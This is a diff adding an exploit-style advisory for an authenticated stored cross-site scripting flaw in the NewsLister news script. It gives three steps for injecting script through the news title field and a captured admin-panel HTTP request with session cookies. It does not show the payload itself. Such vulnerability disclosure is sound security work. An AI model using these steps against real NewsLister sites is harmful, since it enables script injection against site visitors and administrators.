@@ -1,0 +1,29 @@
+# Exploit Title: NewsLister - Authenticated Persistent Cross-Site Scripting
+# Date: 2020-11-27
+# Exploit Author: Emre Aslan
+# Vendor Homepage: https://www.netartmedia.net/newslister.html
+# Tested on: Windows & XAMPP
+
+==> PoC <==
+
+1- Login to admin panel.
+2- Enter the payload to title value.
+3- View the news. XSS will be execute.
+
+==> HTTP Request <==
+
+GET /admin/index.php?page=add HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: host/admin/index.php?page=home
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: AuthUser=administrator~da1907216877e31462c14b35db67de32~1606484275; PHPSESSID=nn5gq66nla4lfs47fq9eoctvuf
